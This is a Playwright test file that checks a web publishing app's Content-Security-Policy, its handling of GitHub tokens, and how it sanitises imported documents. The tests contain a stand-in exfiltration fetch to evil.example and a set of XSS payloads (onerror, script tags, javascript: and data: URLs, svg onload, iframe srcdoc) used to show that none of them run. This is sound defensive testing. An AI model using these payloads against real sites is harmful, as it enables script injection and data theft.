import { expect, test, type Page, type Route } from "@playwright/test";
import { createFakeGithub, type FakeGithub } from "../../../tests/support/fake-github";

/**
 * The desk, built, under the deployed Content-Security-Policy. Any violation fails the test:
 * if the policy blocks something the desk needs, or the desk starts doing something the policy
 * forbids, this is where it shows.
 */

const CORS = {
  "access-control-allow-origin": "*",
  "access-control-allow-headers": "*",
  "access-control-allow-methods": "GET, POST, PUT, PATCH, DELETE",
};

const isPhone = () => test.info().project.name === "iphone";

async function watchViolations(page: Page) {
  await page.addInitScript(() => {
    (window as unknown as { __csp: string[] }).__csp = [];
    document.addEventListener("securitypolicyviolation", (event) => {
      (window as unknown as { __csp: string[] }).__csp.push(`${event.violatedDirective} blocked ${event.blockedURI || "inline"} (${event.sourceFile ?? ""}:${event.lineNumber})`);
    });
  });
  const consoleErrors: string[] = [];
  page.on("console", (message) => {
    if (message.type() === "error" && /content security policy|refused to/i.test(message.text())) consoleErrors.push(message.text());
  });
  return {
    async violations() {
      const seen = await page.evaluate(() => (window as unknown as { __csp?: string[] }).__csp ?? []);
      return [...seen, ...consoleErrors];
    },
  };
}

async function show(page: Page, tab: "list" | "page" | "edit" | "theme") {
  const button = page.getByTestId(`tab-${tab}`);
  if (await button.isVisible()) await button.click();
}

async function mockGithub(page: Page, fake: FakeGithub, seen: string[]) {
  await page.route("https://api.github.com/**", async (route: Route) => {
    const request = route.request();
    seen.push(request.headers()["authorization"] ?? "");
    if (request.method() === "OPTIONS") return route.fulfill({ status: 204, headers: CORS });
    const response = await fake.impl(request.url(), { method: request.method(), headers: request.headers(), body: request.postData() ?? undefined });
    return route.fulfill({ status: response.status, headers: { ...CORS, "content-type": "application/json" }, body: await response.text() });
  });
}

async function createArticle(page: Page, title: string) {
  await show(page, "list");
  await page.getByTestId("new-article").click();
  await page.getByTestId("template-feature").check({ force: true });
  await page.getByTestId("new-title").fill(title);
  await page.getByTestId("new-kicker").fill("DRAFT · Demo");
  await page.getByTestId("new-dek").fill("A fictional draft made from a template.");
  await page.getByTestId("new-create").click();
  await expect(page.getByTestId("page-canvas").locator('[data-twilda-ref="title"]')).toHaveText(title);
}

test.describe("the desk under its deployed Content-Security-Policy", () => {
  test("the document is served with a strict policy", async ({ page }) => {
    const response = await page.goto("/");
    const headers = response!.headers();
    const csp = headers["content-security-policy"] ?? "";
    expect(csp).toContain("script-src 'self'");
    expect(csp).toContain("frame-ancestors 'none'");
    expect(csp).not.toContain("unsafe-inline");
    expect(csp).not.toContain("unsafe-eval");
    expect(headers["x-content-type-options"]).toBe("nosniff");
    expect(headers["referrer-policy"]).toBe("no-referrer");
  });

  test("the violation monitor sees an inline style and a call to another origin", async ({ page }) => {
    const watch = await watchViolations(page);
    await page.goto("/");
    await page.evaluate(() => {
      const style = document.createElement("style");
      style.textContent = "body{outline:1px solid red}";
      document.head.append(style);
      void fetch("https://evil.example/collect").catch(() => undefined);
      const el = document.createElement("div");
      el.setAttribute("style", "color:red");
      document.body.append(el);
    });
    await page.waitForTimeout(300);
    const seen = (await watch.violations()).join("\n");
    expect(seen).toContain("style-src");
    expect(seen).toContain("connect-src");
  });

  test("create, edit, theme, upload and publish raise no violation, and the token is never stored", async ({ page }) => {
    const fake = createFakeGithub();
    const authHeaders: string[] = [];
    await mockGithub(page, fake, authHeaders);
    const watch = await watchViolations(page);
    await page.goto("/");
    await createArticle(page, "Policy Walk");

    await show(page, "page");
    const body = page.getByTestId("page-canvas").locator('[data-twilda-ref="blocks.1.text"]');
    await body.scrollIntoViewIfNeeded();
    if (isPhone()) await body.tap();
    else await body.click();
    await page.keyboard.press("ControlOrMeta+A");
    await page.keyboard.type("Night trains run late and the yard stays lit.");
    await page.evaluate(() => (document.activeElement as HTMLElement | null)?.blur());

    await show(page, "theme");
    await page.getByTestId("theme-color-kicker").fill("#2a6a5a");
    await expect(page.getByTestId("theme-panel")).toBeVisible();

    await show(page, "page");
    const picture = page.getByTestId("page-canvas").locator('img[data-twilda-ref="blocks.0.src"]').first();
    await picture.scrollIntoViewIfNeeded();
    if (isPhone()) await picture.tap();
    else await picture.click();
    const png = await page.evaluate(async () => {
      const canvas = document.createElement("canvas");
      canvas.width = 640;
      canvas.height = 400;
      const ctx = canvas.getContext("2d")!;
      ctx.fillStyle = "#c25b2a";
      ctx.fillRect(0, 0, 640, 400);
      const blob: Blob = await new Promise((done) => canvas.toBlob((value) => done(value!), "image/png"));
      const bytes = new Uint8Array(await blob.arrayBuffer());
      let text = "";
      for (const byte of bytes) text += String.fromCharCode(byte);
      return btoa(text);
    });
    await page.getByTestId("image-upload").setInputFiles({ name: "Yard Photo.png", mimeType: "image/png", buffer: Buffer.from(png, "base64") });
    await expect(page.getByTestId("image-status")).toContainText(/Uploaded/i);
    await page.getByTestId("alt-input").fill("A yard photograph.");
    await page.getByTestId("image-close").click();

    await page.getByTestId("publish").click();
    await page.getByTestId("github-token").fill("github_pat_policy_walk_0123456789");
    await expect(page.getByTestId("github-state")).toContainText("Token set");

    const stored = await page.evaluate(async () => {
      const keys = [...Object.keys(localStorage), ...Object.keys(sessionStorage)];
      const values = [...Object.values(localStorage), ...Object.values(sessionStorage)];
      let idb = "";
      const dbs = (await indexedDB.databases?.()) ?? [];
      for (const info of dbs) {
        if (!info.name) continue;
        const db: IDBDatabase = await new Promise((resolve, reject) => {
          const request = indexedDB.open(info.name!);
          request.onsuccess = () => resolve(request.result);
          request.onerror = () => reject(request.error);
        });
        for (const storeName of Array.from(db.objectStoreNames)) {
          const rows: unknown[] = await new Promise((resolve, reject) => {
            const request = db.transaction(storeName).objectStore(storeName).getAll();
            request.onsuccess = () => resolve(request.result);
            request.onerror = () => reject(request.error);
          });
          idb += JSON.stringify(rows);
        }
        db.close();
      }
      return JSON.stringify({ keys, values }) + idb;
    });
    expect(stored).not.toContain("github_pat_policy_walk");

    await page.getByTestId("confirm-publish").click();
    await expect(page.getByTestId("notice")).toContainText("/pull/");
    expect(authHeaders.length).toBeGreaterThan(0);
    expect(authHeaders.every((value) => value === "Bearer github_pat_policy_walk_0123456789" || value === "")).toBe(true);
    expect(await watch.violations()).toEqual([]);
  });

  test("signing out forgets the token: the next publish is not authenticated", async ({ page }) => {
    const fake = createFakeGithub();
    const authHeaders: string[] = [];
    await mockGithub(page, fake, authHeaders);
    await page.goto("/");
    await createArticle(page, "Sign Out Walk");
    await page.getByTestId("publish").click();
    await page.getByTestId("github-token").fill("github_pat_sign_out_0123456789");
    await expect(page.getByTestId("github-state")).toContainText("Token set");
    await page.getByTestId("github-signout").click();
    await expect(page.getByTestId("github-state")).toContainText("No token");
    await expect(page.getByTestId("github-token")).toHaveValue("");
    await page.getByTestId("confirm-publish").click();
    await expect(page.getByTestId("notice")).toContainText("No GitHub token was pasted");
    expect(authHeaders).toEqual([]);
  });

  test("a hostile document imported into the desk runs no script and renders no foreign element", async ({ page }) => {
    const watch = await watchViolations(page);
    await page.goto("/");
    const hostile = {
      id: "hostile-import",
      kind: "article",
      title: "<img src=x onerror=window.__pwned=1>",
      slug: "hostile-import",
      kicker: "<script>window.__pwned=1</script>",
      dek: "[click](javascript:window.__pwned=1) and [x](data:text/html,<script>window.__pwned=1</script>)",
      byline: '"><svg onload=window.__pwned=1>',
      status: "draft",
      updatedAt: "2026-11-15T00:00:00.000Z",
      blocks: [
        { id: "p1", type: "paragraph", text: "**bold<img src=x onerror=window.__pwned=1>** [a](javascript:window.__pwned=1) [b](//evil.example) [c](/\\evil.example)" },
        { id: "i1", type: "image", src: "javascript:window.__pwned=1", alt: '" onerror="window.__pwned=1', caption: "<b onclick=window.__pwned=1>x</b>", role: "figure" },
        { id: "s1", type: "sources", title: "Sources", items: [{ id: "a", label: "<script>window.__pwned=1</script>", href: "javascript:window.__pwned=1" }] },
        { id: "e1", type: "embed", kind: "video", src: "https://www.youtube.com.evil.example/watch?v=dQw4w9WgXcQ", title: "<iframe srcdoc='<script>window.__pwned=1</script>'>", caption: "" },
      ],
    };
    await show(page, "list");
    await page.getByTestId("import-input").setInputFiles({ name: "hostile.json", mimeType: "application/json", buffer: Buffer.from(JSON.stringify(hostile)) });
    await show(page, "page");
    const canvas = page.getByTestId("page-canvas");
    await expect(canvas).toBeVisible();
    await expect(canvas).toContainText("<img src=x onerror=window.__pwned=1>");
    for (const link of await canvas.locator("a[href]").all()) {
      const href = (await link.getAttribute("href")) ?? "";
      expect(href, href).not.toMatch(/^\s*(javascript|data|vbscript):/i);
      expect(href, href).not.toMatch(/^\/[\\/]/);
    }
    expect(await canvas.locator("script, [onerror], [onload], [onclick], svg, iframe[srcdoc]").count()).toBe(0);
    expect(await canvas.locator("iframe").count()).toBe(0);
    await page.waitForTimeout(300);
    expect(await page.evaluate(() => (window as unknown as { __pwned?: number }).__pwned)).toBeUndefined();
    expect(await watch.violations()).toEqual([]);
  });
});
